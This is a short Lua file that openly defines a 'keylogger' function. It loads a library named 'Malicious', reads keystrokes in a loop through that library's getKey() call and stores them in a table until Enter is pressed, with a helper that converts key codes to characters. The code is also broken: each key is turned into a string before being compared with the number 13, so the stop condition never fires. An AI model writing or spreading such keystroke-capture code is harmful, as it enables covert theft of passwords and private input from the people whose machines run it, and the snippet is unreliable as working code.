local mylib = require("Malicious")

function keylogger()
	
	local Pressed = {}

	while true do
		local key = asciiToString(mylib.getKey())

		if(key==13) then
			break
		end

		table.insert(Pressed,key)

	end

	return Pressed

end

function asciiToString(asciiValue)
    return string.char(asciiValue)
end